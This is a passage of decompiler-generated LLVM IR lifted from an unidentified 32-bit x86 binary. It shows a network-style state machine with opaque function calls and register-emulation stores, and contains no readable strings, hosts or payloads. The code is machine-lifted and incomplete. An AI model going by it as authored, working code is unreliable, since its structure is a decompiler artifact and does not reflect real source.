  %v3_80506c1 = inttoptr i32 %v2_80506c1 to i32*
  store i32 %v3_80506be, i32* %v3_80506c1, align 4
  %v0_80506c2 = call i32 @function_80521c4()
  store i32 %v0_80506c2, i32* %eax.global-to-local, align 4
  %v0_80506c7 = load i32, i32* @esp, align 4
  %v1_80506c7 = inttoptr i32 %v0_80506c7 to i32*
  store i32 23, i32* %v1_80506c7, align 4
  %v2_80506ce = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80506ce, i32* %eax.global-to-local, align 4
  %v0_80506d6 = load i32, i32* @edi, align 4
  %v1_80506d6 = add i32 %v0_80506d6, 12
  %v2_80506d6 = inttoptr i32 %v1_80506d6 to i32*
  store i32 9, i32* %v2_80506d6, align 4
  br label %dec_label_pc_8050383

dec_label_pc_80506e2:                             ; preds = %dec_label_pc_8050147, %dec_label_pc_805013e, %dec_label_pc_8050135, %dec_label_pc_805012c, %dec_label_pc_805011f
  %v1_80506e2 = add i32 %v0_80506e2, 1
  store i32 %v1_80506e2, i32* @ebp, align 4
  %v10_80506e5 = icmp eq i32 %v0_80506e2, -2
  br i1 %v10_80506e5, label %dec_label_pc_8050153, label %dec_label_pc_80506ee

dec_label_pc_80506ee:                             ; preds = %dec_label_pc_80506e2, %dec_label_pc_8050173, %dec_label_pc_8050153
  %v0_80506ee = phi i32 [ %v1_80506e2, %dec_label_pc_80506e2 ], [ %v0_8050183, %dec_label_pc_8050173 ], [ %v0_8050160, %dec_label_pc_8050153 ]
  %tmp138 = icmp slt i32 %v0_80506ee, 1
  br i1 %tmp138, label %dec_label_pc_8050523, label %dec_label_pc_80506f6

dec_label_pc_80506f6:                             ; preds = %dec_label_pc_80506ee
  %v0_80506f6 = load i32, i32* @edi, align 4
  %v1_80506f6 = inttoptr i32 %v0_80506f6 to i32*
  %v2_80506f6 = load i32, i32* %v1_80506f6, align 4
  store i32 %v2_80506f6, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80506fa = load i32, i32* @esp, align 4
  %v1_80506fa = add i32 %v0_80506fa, -4
  %v2_80506fa = inttoptr i32 %v1_80506fa to i32*
  store i32 16384, i32* %v2_80506fa, align 4
  %v0_80506ff = load i32, i32* %edx.global-to-local, align 4
  %v1_80506ff = add i32 %v0_80506ff, 12
  %v2_80506ff = inttoptr i32 %v1_80506ff to i8*
  %v3_80506ff = load i8, i8* %v2_80506ff, align 1
  %v4_80506ff = zext i8 %v3_80506ff to i32
  %v5_80506ff = load i32, i32* %eax.global-to-local, align 4
  %v6_80506ff = and i32 %v5_80506ff, -256
  %v7_80506ff = or i32 %v6_80506ff, %v4_80506ff
  store i32 %v7_80506ff, i32* %eax.global-to-local, align 4
  %v2_8050702 = add i32 %v0_80506fa, -8
  %v3_8050702 = inttoptr i32 %v2_8050702 to i32*
  store i32 %v7_80506ff, i32* %v3_8050702, align 4
  %v0_8050703 = load i32, i32* %edx.global-to-local, align 4
  %v1_8050703 = inttoptr i32 %v0_8050703 to i32*
  %v2_8050703 = load i32, i32* %v1_8050703, align 4
  store i32 %v2_8050703, i32* %eax.global-to-local, align 4
  %v2_8050705 = add i32 %v0_80506fa, -12
  %v3_8050705 = inttoptr i32 %v2_8050705 to i32*
  store i32 %v2_8050703, i32* %v3_8050705, align 4
  %v0_8050706 = load i32, i32* @edi, align 4
  %v1_8050706 = add i32 %v0_8050706, 4
  %v2_8050706 = inttoptr i32 %v1_8050706 to i32*
  %v3_8050706 = load i32, i32* %v2_8050706, align 4
  store i32 %v3_8050706, i32* %eax.global-to-local, align 4
  %v2_8050709 = add i32 %v0_80506fa, -16
  %v3_8050709 = inttoptr i32 %v2_8050709 to i32*
  store i32 %v3_8050706, i32* %v3_8050709, align 4
  %v0_805070a = call i32 @function_80521c4()
  store i32 %v0_805070a, i32* %eax.global-to-local, align 4
  %v0_805070f = load i32, i32* @esp, align 4
  %v1_805070f = add i32 %v0_805070f, -4
  %v2_805070f = inttoptr i32 %v1_805070f to i32*
  store i32 16384, i32* %v2_805070f, align 4
  %v1_8050714 = add i32 %v0_805070f, -8
  %v2_8050714 = inttoptr i32 %v1_8050714 to i32*
  store i32 2, i32* %v2_8050714, align 4
  %v1_8050716 = add i32 %v0_805070f, -12
  %v2_8050716 = inttoptr i32 %v1_8050716 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_8050716, align 4
  %v0_805071b = load i32, i32* @edi, align 4
  %v1_805071b = add i32 %v0_805071b, 4
  %v2_805071b = inttoptr i32 %v1_805071b to i32*
  %v3_805071b = load i32, i32* %v2_805071b, align 4
  store i32 %v3_805071b, i32* %eax.global-to-local, align 4
  %v2_805071e = add i32 %v0_805070f, -16
  %v3_805071e = inttoptr i32 %v2_805071e to i32*
  store i32 %v3_805071b, i32* %v3_805071e, align 4
  %v0_805071f = call i32 @function_80521c4()
  store i32 %v0_805071f, i32* %eax.global-to-local, align 4
  %v0_8050727 = load i32, i32* @edi, align 4
  %v1_8050727 = add i32 %v0_8050727, 12
  %v2_8050727 = inttoptr i32 %v1_8050727 to i32*
  store i32 4, i32* %v2_8050727, align 4
  br label %dec_label_pc_8050383

dec_label_pc_8050733:                             ; preds = %dec_label_pc_804fff0, %dec_label_pc_804ffe7, %dec_label_pc_804ffde, %dec_label_pc_804ffd5, %dec_label_pc_804ffc8
  %v1_8050733 = add i32 %v0_8050733, 1
  store i32 %v1_8050733, i32* @ebp, align 4
  %v10_8050736 = icmp eq i32 %v0_8050733, -2
  br i1 %v10_8050736, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_805073f

dec_label_pc_805073f:                             ; preds = %dec_label_pc_8050733
  %tmp139 = icmp slt i32 %v1_8050733, 1
  br i1 %tmp139, label %dec_label_pc_8050523, label %dec_label_pc_8050747

dec_label_pc_8050747:                             ; preds = %dec_label_pc_805073f
  %v0_8050747 = load i32, i32* @esp, align 4
  %v1_805074a = add i32 %v0_8050747, -16
  %v2_805074a = inttoptr i32 %v1_805074a to i32*
  store i32 21, i32* %v2_805074a, align 4
  %v2_805074c = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805074c, i32* %eax.global-to-local, align 4
  %v0_8050751 = load i32, i32* @esp, align 4
  %v1_8050751 = inttoptr i32 %v0_8050751 to i32*
  %v2_8050751 = load i32, i32* %v1_8050751, align 4
  store i32 %v2_8050751, i32* %eax.global-to-local, align 4
  %v3_8050751 = add i32 %v0_8050751, 4
  %v1_8050752 = inttoptr i32 %v3_8050751 to i32*
  %v2_8050752 = load i32, i32* %v1_8050752, align 4
  store i32 %v2_8050752, i32* %edx.global-to-local, align 4
  %v1_8050753 = add i32 %v0_8050751, 1864
  store i32 %v1_8050753, i32* %eax.global-to-local, align 4
  store i32 %v1_8050753, i32* %v1_8050752, align 4
  store i32 21, i32* %v1_8050751, align 4
  %v3_805075d = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_805075d, i32* %eax.global-to-local, align 4
  %v0_8050762 = load i32, i32* @esp, align 4
  %v1_8050762 = add i32 %v0_8050762, -4
  %v2_8050762 = inttoptr i32 %v1_8050762 to i32*
  store i32 16384, i32* %v2_8050762, align 4
  %v1_8050767 = add i32 %v0_8050762, 1864
  %v2_8050767 = inttoptr i32 %v1_8050767 to i32*
  %v3_8050767 = load i32, i32* %v2_8050767, align 4
  store i32 %v3_8050767, i32* @esi, align 4
  %v2_805076e = add i32 %v0_8050762, -8
  %v3_805076e = inttoptr i32 %v2_805076e to i32*
  store i32 %v3_8050767, i32* %v3_805076e, align 4
  %v2_805076f = add i32 %v0_8050762, -12
  %v3_805076f = inttoptr i32 %v2_805076f to i32*
  store i32 %v3_805075d, i32* %v3_805076f, align 4
  %v0_8050770 = load i32, i32* @edi, align 4
  %v1_8050770 = add i32 %v0_8050770, 4
  %v2_8050770 = inttoptr i32 %v1_8050770 to i32*
  %v3_8050770 = load i32, i32* %v2_8050770, align 4
  store i32 %v3_8050770, i32* @ebx, align 4
  %v2_8050773 = add i32 %v0_8050762, -16
  %v3_8050773 = inttoptr i32 %v2_8050773 to i32*
  store i32 %v3_8050770, i32* %v3_8050773, align 4
  %v0_8050774 = call i32 @function_80521c4()
  store i32 %v0_8050774, i32* %eax.global-to-local, align 4
  %v0_8050779 = load i32, i32* @esp, align 4
  %v1_805077c = add i32 %v0_8050779, 28
  %v2_805077c = inttoptr i32 %v1_805077c to i32*
  store i32 16384, i32* %v2_805077c, align 4
  %v1_8050781 = add i32 %v0_8050779, 24
  %v2_8050781 = inttoptr i32 %v1_8050781 to i32*
  store i32 2, i32* %v2_8050781, align 4
  %v1_8050783 = add i32 %v0_8050779, 20
  %v2_8050783 = inttoptr i32 %v1_8050783 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_8050783, align 4
  %v0_8050788 = load i32, i32* @edi, align 4
  %v1_8050788 = add i32 %v0_8050788, 4
  %v2_8050788 = inttoptr i32 %v1_8050788 to i32*
  %v3_8050788 = load i32, i32* %v2_8050788, align 4
  store i32 %v3_8050788, i32* %ecx.global-to-local, align 4
  %v2_805078b = add i32 %v0_8050779, 16
  %v3_805078b = inttoptr i32 %v2_805078b to i32*
  store i32 %v3_8050788, i32* %v3_805078b, align 4
  %v0_805078c = call i32 @function_80521c4()
  store i32 %v0_805078c, i32* %eax.global-to-local, align 4
  %v0_8050791 = load i32, i32* @esp, align 4
  %v1_8050791 = inttoptr i32 %v0_8050791 to i32*
  store i32 21, i32* %v1_8050791, align 4
  %v2_8050798 = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050798, i32* %eax.global-to-local, align 4
  %v0_80507a0 = load i32, i32* @edi, align 4
  %v1_80507a0 = add i32 %v0_80507a0, 12
  %v2_80507a0 = inttoptr i32 %v1_80507a0 to i32*
  store i32 6, i32* %v2_80507a0, align 4
  br label %dec_label_pc_8050383

dec_label_pc_80507ac:                             ; preds = %dec_label_pc_80501c9, %dec_label_pc_80501c0, %dec_label_pc_80501b7, %dec_label_pc_80501aa
  %v1_80507ac = add i32 %v0_80507ac, 1
  store i32 %v1_80507ac, i32* @ebp, align 4
  %v10_80507af = icmp eq i32 %v0_80507ac, -2
  br i1 %v10_80507af, label %dec_label_pc_80501d5, label %dec_label_pc_80507b8

dec_label_pc_80507b8:                             ; preds = %dec_label_pc_80507ac, %dec_label_pc_80501d5
  %v0_80507b8 = phi i32 [ %v1_80507ac, %dec_label_pc_80507ac ], [ %v0_80501e2, %dec_label_pc_80501d5 ]
  %tmp140 = icmp slt i32 %v0_80507b8, 1
  br i1 %tmp140, label %dec_label_pc_8050523, label %dec_label_pc_80507c0

dec_label_pc_80507c0:                             ; preds = %dec_label_pc_80507b8
  %v0_80507c0 = load i32, i32* @edi, align 4
  %v1_80507c0 = inttoptr i32 %v0_80507c0 to i32*
  %v2_80507c0 = load i32, i32* %v1_80507c0, align 4
  store i32 %v2_80507c0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80507c4 = load i32, i32* @esp, align 4
  %v1_80507c4 = add i32 %v0_80507c4, -4
  %v2_80507c4 = inttoptr i32 %v1_80507c4 to i32*
  store i32 16384, i32* %v2_80507c4, align 4
  %v0_80507c9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80507c9 = add i32 %v0_80507c9, 13
  %v2_80507c9 = inttoptr i32 %v1_80507c9 to i8*
  %v3_80507c9 = load i8, i8* %v2_80507c9, align 1
  %v4_80507c9 = zext i8 %v3_80507c9 to i32
  %v5_80507c9 = load i32, i32* %eax.global-to-local, align 4
  %v6_80507c9 = and i32 %v5_80507c9, -256
  %v7_80507c9 = or i32 %v6_80507c9, %v4_80507c9
  store i32 %v7_80507c9, i32* %eax.global-to-local, align 4
  %v2_80507cc = add i32 %v0_80507c4, -8
  %v3_80507cc = inttoptr i32 %v2_80507cc to i32*
  store i32 %v7_80507c9, i32* %v3_80507cc, align 4
  %v0_80507cd = load i32, i32* %edx.global-to-local, align 4
  %v1_80507cd = add i32 %v0_80507cd, 4
  %v2_80507cd = inttoptr i32 %v1_80507cd to i32*
  %v3_80507cd = load i32, i32* %v2_80507cd, align 4
  store i32 %v3_80507cd, i32* @esi, align 4
  %v2_80507d0 = add i32 %v0_80507c4, -12
  %v3_80507d0 = inttoptr i32 %v2_80507d0 to i32*
  store i32 %v3_80507cd, i32* %v3_80507d0, align 4
  %v0_80507d1 = load i32, i32* @edi, align 4
  %v1_80507d1 = add i32 %v0_80507d1, 4
  %v2_80507d1 = inttoptr i32 %v1_80507d1 to i32*
  %v3_80507d1 = load i32, i32* %v2_80507d1, align 4
  store i32 %v3_80507d1, i32* @ebx, align 4
  %v2_80507d4 = add i32 %v0_80507c4, -16
  %v3_80507d4 = inttoptr i32 %v2_80507d4 to i32*
  store i32 %v3_80507d1, i32* %v3_80507d4, align 4
  %v0_80507d5 = call i32 @function_80521c4()
  store i32 %v0_80507d5, i32* %eax.global-to-local, align 4
  %v0_80507da = load i32, i32* @esp, align 4
  %v1_80507da = add i32 %v0_80507da, -4
  %v2_80507da = inttoptr i32 %v1_80507da to i32*
  store i32 16384, i32* %v2_80507da, align 4
  %v1_80507df = add i32 %v0_80507da, -8
  %v2_80507df = inttoptr i32 %v1_80507df to i32*
  store i32 2, i32* %v2_80507df, align 4
  %v1_80507e1 = add i32 %v0_80507da, -12
  %v2_80507e1 = inttoptr i32 %v1_80507e1 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_80543a6.10 to i32), i32* %v2_80507e1, align 4
  %v0_80507e6 = load i32, i32* @edi, align 4
  %v1_80507e6 = add i32 %v0_80507e6, 4
  %v2_80507e6 = inttoptr i32 %v1_80507e6 to i32*
  %v3_80507e6 = load i32, i32* %v2_80507e6, align 4
  store i32 %v3_80507e6, i32* %ecx.global-to-local, align 4
  %v2_80507e9 = add i32 %v0_80507da, -16
  %v3_80507e9 = inttoptr i32 %v2_80507e9 to i32*
  store i32 %v3_80507e6, i32* %v3_80507e9, align 4
  %v0_80507ea = call i32 @function_80521c4()
  store i32 %v0_80507ea, i32* %eax.global-to-local, align 4
  %v0_80507f2 = load i32, i32* @edi, align 4
  %v1_80507f2 = add i32 %v0_80507f2, 12
  %v2_80507f2 = inttoptr i32 %v1_80507f2 to i32*
  store i32 5, i32* %v2_80507f2, align 4
  br label %dec_label_pc_8050383

dec_label_pc_80507fe:                             ; preds = %dec_label_pc_80505bb
  %v1_80507fe = add i32 %v0_80505a7, -4
  %v2_80507fe = inttoptr i32 %v1_80507fe to i32*
  store i32 16384, i32* %v2_80507fe, align 4
  %v1_8050803 = add i32 %v0_80505a7, -8
  %v2_8050803 = inttoptr i32 %v1_8050803 to i32*
  store i32 3, i32* %v2_8050803, align 4
  %v1_8050805 = add i32 %v0_80505a7, 1863
  store i32 %v1_8050805, i32* %eax.global-to-local, align 4
  %v0_805080c = load i32, i32* @ebx, align 4
  %v1_805080c = add i32 %v0_805080c, 3
  store i32 %v1_805080c, i32* @ebx, align 4
  %v2_805080f = add i32 %v0_80505a7, -12
  %v3_805080f = inttoptr i32 %v2_805080f to i32*
  store i32 %v1_8050805, i32* %v3_805080f, align 4
  %v0_8050810 = load i32, i32* @ebp, align 4
  %v1_8050810 = add i32 %v0_8050810, 3
  store i32 %v1_8050810, i32* @ebp, align 4
  %v0_8050813 = load i32, i32* @edi, align 4
  %v1_8050813 = add i32 %v0_8050813, 4
  %v2_8050813 = inttoptr i32 %v1_8050813 to i32*
  %v3_8050813 = load i32, i32* %v2_8050813, align 4
  store i32 %v3_8050813, i32* @esi, align 4
  %v2_8050816 = add i32 %v0_80505a7, -16
  %v3_8050816 = inttoptr i32 %v2_8050816 to i32*
  store i32 %v3_8050813, i32* %v3_8050816, align 4
  %v0_8050817 = call i32 @function_80521c4()
  %v0_805081c = load i32, i32* @esp, align 4
  %v1_805081c = add i32 %v0_805081c, -4
  %v2_805081c = inttoptr i32 %v1_805081c to i32*
  store i32 16384, i32* %v2_805081c, align 4
  %v1_8050821 = add i32 %v0_805081c, -8
  %v2_8050821 = inttoptr i32 %v1_8050821 to i32*
  store i32 9, i32* %v2_8050821, align 4
  %v1_8050823 = add i32 %v0_805081c, 1847
  store i32 %v1_8050823, i32* %eax.global-to-local, align 4
  %v2_805082a = add i32 %v0_805081c, -12
  %v3_805082a = inttoptr i32 %v2_805082a to i32*
  store i32 %v1_8050823, i32* %v3_805082a, align 4
  %v0_805082b = load i32, i32* @edi, align 4
  %v1_805082b = add i32 %v0_805082b, 4
  %v2_805082b = inttoptr i32 %v1_805082b to i32*
  %v3_805082b = load i32, i32* %v2_805082b, align 4
  store i32 %v3_805082b, i32* %ecx.global-to-local, align 4
  %v2_805082e = add i32 %v0_805081c, -16
  %v3_805082e = inttoptr i32 %v2_805082e to i32*
  store i32 %v3_805082b, i32* %v3_805082e, align 4
  %v0_805082f = call i32 @function_80521c4()
  store i32 %v0_805082f, i32* %eax.global-to-local, align 4
  %v0_8050834 = load i32, i32* @esp, align 4
  %v1_8050834 = add i32 %v0_8050834, 32
  %v0_8050837 = load i32, i32* @edi, align 4
  %v1_8050837 = add i32 %v0_8050837, 24
  %v2_8050837 = inttoptr i32 %v1_8050837 to i32*
  %v3_8050837 = load i32, i32* %v2_8050837, align 4
  store i32 %v3_8050837, i32* %edx.global-to-local, align 4
  %v0_805008b.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_805008b.backedge

dec_label_pc_805083f:                             ; preds = %dec_label_pc_80502fc
  store i32 25, i32* %v1_8050849, align 4
  %v2_8050850 = call i32 @function_8050be0(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050850, i32* %eax.global-to-local, align 4
  %v0_8050855 = load i32, i32* @esp, align 4
  %v1_8050855 = inttoptr i32 %v0_8050855 to i32*
  %v3_8050855 = add i32 %v0_8050855, 4
  %v1_8050856 = inttoptr i32 %v3_8050855 to i32*
  %v2_8050856 = load i32, i32* %v1_8050856, align 4
  store i32 %v2_8050856, i32* %eax.global-to-local, align 4
  %v1_8050857 = add i32 %v0_8050855, 1864
  store i32 %v1_8050857, i32* %edx.global-to-local, align 4
  store i32 %v1_8050857, i32* %v1_8050856, align 4
  store i32 25, i32* %v1_8050855, align 4
  %v3_8050861 = call i32 @function_8050b30(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8050861, i32* %eax.global-to-local, align 4
  %v0_8050866 = load i32, i32* @esp, align 4
  %v1_8050866 = add i32 %v0_8050866, 1864
  %v2_8050866 = inttoptr i32 %v1_8050866 to i32*
  %v3_8050866 = load i32, i32* %v2_8050866, align 4
  %v1_805086d = add i32 %v3_8050866, -1
  store i32 %v1_805086d, i32* %edx.global-to-local, align 4
  %v2_805086e = add i32 %v0_8050866, -4
  %v3_805086e = inttoptr i32 %v2_805086e to i32*
  store i32 %v1_805086d, i32* %v3_805086e, align 4
  %v2_805086f = add i32 %v0_8050866, -8
  %v3_805086f = inttoptr i32 %v2_805086f to i32*
  store i32 %v3_8050861, i32* %v3_805086f, align 4
  %v0_8050870 = load i32, i32* @edi, align 4
  %v1_8050870 = add i32 %v0_8050870, 24
  %v2_8050870 = inttoptr i32 %v1_8050870 to i32*
  %v3_8050870 = load i32, i32* %v2_8050870, align 4
  store i32 %v3_8050870, i32* @esi, align 4
  %v2_8050873 = add i32 %v0_8050866, -12
  %v3_8050873 = inttoptr i32 %v2_8050873 to i32*
  store i32 %v3_8050870, i32* %v3_8050873, align 4
  %v1_8050874 = add i32 %v0_8050866, 24
  %v2_8050874 = inttoptr i32 %v1_8050874 to i32*
  %v3_8050874 = load i32, i32* %v2_8050874, align 4
  store i32 %v3_8050874, i32* @ebx, align 4
  %v2_8050878 = add i32 %v0_8050866, -16
  %v3_8050878 = inttoptr i32 %v2_8050878 to i32*
  store i32 %v3_8050874, i32* %v3_8050878, align 4
  %v0_8050879 = call i32 @function_8051590()
  store i32 %v0_8050879, i32* %eax.global-to-local, align 4
  %v0_805087e = load i32, i32* @esp, align 4
  store i32 %v0_8050879, i32* @ebp, align 4
  %v1_8050883 = add i32 %v0_805087e, 16
  %v2_8050883 = inttoptr i32 %v1_8050883 to i32*
  store i32 25, i32* %v2_8050883, align 4
  %v2_8050885 = call i32 @function_8050b60(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8050885, i32* %eax.global-to-local, align 4
  %v0_805088a = load i32, i32* @esp, align 4
  %v0_805088d = load i32, i32* @ebp, align 4
  %v10_805088d = icmp eq i32 %v0_805088d, -1
  br i1 %v10_805088d, label %dec_label_pc_804fffc.loopexit12.loopexit, label %dec_label_pc_8050896

dec_label_pc_8050896:                             ; preds = %dec_label_pc_805083f
  %tmp141 = icmp slt i32 %v0_805088d, 1
  br i1 %tmp141, label %dec_label_pc_8050523, label %dec_label_pc_805089e

dec_label_pc_805089e:                             ; preds = %dec_label_pc_8050896
  %v0_805089e = load i32, i32* @edi, align 4
  %v1_805089e = add i32 %v0_805089e, 20
  %v2_805089e = inttoptr i32 %v1_805089e to i32*
  %v3_805089e = load i32, i32* %v2_805089e, align 4
  store i32 %v3_805089e, i32* %edx.global-to-local, align 4
  %v1_80508a1 = add i32 %v0_805089e, 16
  %v2_80508a1 = inttoptr i32 %v1_80508a1 to i32*
  %v3_80508a1 = load i32, i32* %v2_80508a1, align 4
  store i32 %v3_80508a1, i32* %eax.global-to-local, align 4
  %v1_80508a4 = inttoptr i32 %v0_805089e to i32*
  %v2_80508a4 = load i32, i32* %v1_80508a4, align 4
  store i32 %v2_80508a4, i32* @esi, align 4
  %v2_80508a6 = add i32 %v0_805088a, 1872
  %v3_80508a6 = inttoptr i32 %v2_80508a6 to i32*
  store i32 %v3_80508a1, i32* %v3_80508a6, align 4
  %v0_80508ad = load i32, i32* %edx.global-to-local, align 4
  %v1_80508ad = trunc i32 %v0_80508ad to i16
  %v2_80508ad = load i32, i32* @esp, align 4
  %v3_80508ad = add i32 %v2_80508ad, 1866
  %v4_80508ad = inttoptr i32 %v3_80508ad to i16*
  store i16 %v1_80508ad, i16* %v4_80508ad, align 2
  %v0_80508b5 = call i32 @function_8051aaf()
  store i32 %v0_80508b5, i32* %eax.global-to-local, align 4
  %tmp142 = icmp slt i32 %v0_80508b5, 1
  br i1 %tmp142, label %dec_label_pc_80509c7, label %dec_label_pc_80508c2

dec_label_pc_80508c2:                             ; preds = %dec_label_pc_80509c7, %dec_label_pc_805089e
  %v0_80508c2 = load i32, i32* @esp, align 4
  %v0_80508c5 = load i32, i32* @edi, align 4
  %v1_80508c5 = add i32 %v0_80508c5, 4
  %v2_80508c5 = inttoptr i32 %v1_80508c5 to i32*
  %v3_80508c5 = load i32, i32* %v2_80508c5, align 4
  store i32 %v3_80508c5, i32* @esi, align 4
  %v2_80508c8 = add i32 %v0_80508c2, -16
  %v3_80508c8 = inttoptr i32 %v2_80508c8 to i32*
  store i32 %v3_80508c5, i32* %v3_80508c8, align 4
  %v1_80508c9 = call i32 @function_8051a81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80508c9, i32* %eax.global-to-local, align 4
  %v0_80508d1 = load i32, i32* @edi, align 4
  %v1_80508d1 = add i32 %v0_80508d1, 4
  %v2_80508d1 = inttoptr i32 %v1_80508d1 to i32*
  store i32 -1, i32* %v2_80508d1, align 4
  %v0_80508d8 = load i32, i32* @edi, align 4
  %v1_80508d8 = add i32 %v0_80508d8, 12
  %v2_80508d8 = inttoptr i32 %v1_80508d8 to i32*
  store i32 0, i32* %v2_80508d8, align 4
  br label %dec_label_pc_8050383

dec_label_pc_80508e4:                             ; preds = %dec_label_pc_804fe17
  %v3_80508ef = add nuw nsw i32 %v2_80508ef, 1556
  %v4_80508ef = add i32 %v3_80508ef, %v0_80508ef
  %v5_80508ef = inttoptr i32 %v4_80508ef to i32*
  %v6_80508ef = load i32, i32* %v5_80508ef, align 4
  %v9_80508ef = shl i32 1, %v1_80508e9
  %v12_80508ef = or i32 %v6_80508ef, %v9_80508ef
  store i32 %v12_80508ef, i32* %v5_80508ef, align 4
  %v0_80508f7 = load i32, i32* @ebx, align 4
  %v1_80508f7 = add i32 %v0_80508f7, 4
  %v2_80508f7 = inttoptr i32 %v1_80508f7 to i32*
  %v3_80508f7 = load i32, i32* %v2_80508f7, align 4
  store i32 %v3_80508f7, i32* %eax.global-to-local, align 4
  %v0_80508fa = load i32, i32* @esi, align 4
  %v2_80508fa = sub i32 %v0_80508fa, %v3_80508f7
  %v8_80508fa = xor i32 %v0_80508fa, %v3_80508f7
  %v9_80508fa = xor i32 %v2_80508fa, %v0_80508fa
  %v10_80508fa = and i32 %v9_80508fa, %v8_80508fa
  %v11_80508fa = icmp slt i32 %v10_80508fa, 0
  %v13_80508fa = icmp slt i32 %v2_80508fa, 0
  %v2_80508fc = icmp eq i1 %v13_80508fa, %v11_80508fa
  br i1 %v2_80508fc, label %dec_label_pc_804fe3a, label %dec_label_pc_8050902

dec_label_pc_8050902:                             ; preds = %dec_label_pc_80508e4
  store i32 %v3_80508f7, i32* @esi, align 4
  br label %dec_label_pc_804fe3a

dec_label_pc_8050910:                             ; preds = %dec_label_pc_804fde7
  br i1 %v5_804fdfc, label %dec_label_pc_804fe3a, label %dec_label_pc_8050918

dec_label_pc_8050918:                             ; preds = %dec_label_pc_8050910
  store i32 5, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fe05

dec_label_pc_8050920:                             ; preds = %dec_label_pc_804fe05
  %v0_8050920 = load i32, i32* @esp, align 4
  %v1_8050923 = add i32 %v2_804fdf7, 4
  %v2_8050923 = inttoptr i32 %v1_8050923 to i32*
  %v3_8050923 = load i32, i32* %v2_8050923, align 4
  %v2_8050926 = add i32 %v0_8050920, -16
  %v3_8050926 = inttoptr i32 %v2_8050926 to i32*
  store i32 %v3_8050923, i32* %v3_8050926, align 4
  %v1_8050927 = call i32 @function_8051a81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_8050927, i32* %eax.global-to-local, align 4
  %v0_805092f = load i32, i32* @ebx, align 4
  %v1_805092f = add i32 %v0_805092f, 4
  %v2_805092f = inttoptr i32 %v1_805092f to i32*
  store i32 -1, i32* %v2_805092f, align 4
  %v0_8050936 = load i32, i32* @ebx, align 4
  %v1_8050936 = add i32 %v0_8050936, 12
  %v2_8050936 = inttoptr i32 %v1_8050936 to i32*
  %v3_8050936 = load i32, i32* %v2_8050936, align 4
  %tmp276 = icmp ult i32 %v3_8050936, 3
  br i1 %tmp276, label %dec_label_pc_8050953, label %dec_label_pc_805093c

dec_label_pc_805093c:                             ; preds = %dec_label_pc_8050920
  %v0_805093c = load i32, i32* @global_var_8056158.47, align 8
  store i32 %v0_805093c, i32* %edx.global-to-local, align 4
  %v0_8050942 = load i32, i32* @esp, align 4
  %v1_8050942 = add i32 %v0_8050942, 1852
  %v2_8050942 = inttoptr i32 %v1_8050942 to i32*
  %v3_8050942 = load i32, i32* %v2_8050942, align 4
  store i32 %v3_8050942, i32* %eax.global-to-local, align 4
  %v1_8050949 = add i32 %v0_805093c, -1
  store i32 %v1_8050949, i32* %edx.global-to-local, align 4
  %v1_805094a = mul i32 %v3_8050942, 4
  %v2_805094a = add i32 %v1_805094a, 134570496
  %v3_805094a = inttoptr i32 %v2_805094a to i32*
  %v4_805094a = load i32, i32* %v3_805094a, align 4
  %v6_805094a = sub i32 %v4_805094a, %v1_8050949
  %v12_805094a = xor i32 %v4_805094a, %v1_8050949
  %v13_805094a = xor i32 %v6_805094a, %v4_805094a
  %v14_805094a = and i32 %v13_805094a, %v12_805094a
  %v15_805094a = icmp slt i32 %v14_805094a, 0
  %v16_805094a = icmp eq i32 %v6_805094a, 0
  %v17_805094a = icmp slt i32 %v6_805094a, 0
  %v3_8050951 = icmp ne i1 %v17_805094a, %v15_805094a
  %v4_8050951 = or i1 %v16_805094a, %v3_8050951
  br i1 %v4_8050951, label %dec_label_pc_8050981, label %dec_label_pc_8050953

dec_label_pc_8050953:                             ; preds = %dec_label_pc_805093c, %dec_label_pc_8050920
  %v1_8050953 = add i32 %v0_8050936, 284
  %v2_8050953 = inttoptr i32 %v1_8050953 to i8*
  store i8 0, i8* %v2_8050953, align 1
  %v0_805095a = load i32, i32* @ebx, align 4
  %v1_805095a = add i32 %v0_805095a, 12
  %v2_805095a = inttoptr i32 %v1_805095a to i32*
  store i32 0, i32* %v2_805095a, align 4
  br label %dec_label_pc_804fe3a

dec_label_pc_8050981:                             ; preds = %dec_label_pc_805093c
  store i32 %v0_8050936, i32* @eax, align 4
  %v0_8050983 = call i32 @function_804f2d0()
  store i32 %v0_8050983, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fe3a

dec_label_pc_805098d:                             ; preds = %dec_label_pc_80505c5
  %v11_805098d = icmp eq i8 %v2_80505c5, -5
  %v1_805098f = icmp eq i1 %v11_805098d, false
  br i1 %v1_805098f, label %dec_label_pc_80500bb, label %dec_label_pc_8050995

dec_label_pc_8050995:                             ; preds = %dec_label_pc_805098d
  store i8 -3, i8* %v1_80505c5, align 1
  br label %dec_label_pc_80500bb

dec_label_pc_805099d:                             ; preds = %dec_label_pc_80505d7
  %v1_805099d = add i32 %v0_8050045, 40
  %v2_805099d = inttoptr i32 %v1_805099d to i32*
  %v3_805099d = load i32, i32* %v2_805099d, align 4
  store i32 %v3_805099d, i32* %edx.global-to-local, align 4
  %v1_80509a1 = inttoptr i32 %v3_805099d to i32*
  store i32 104, i32* %v1_80509a1, align 4
  %v0_80505f3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80505f3

dec_label_pc_80509ac:                             ; preds = %dec_label_pc_80505f3
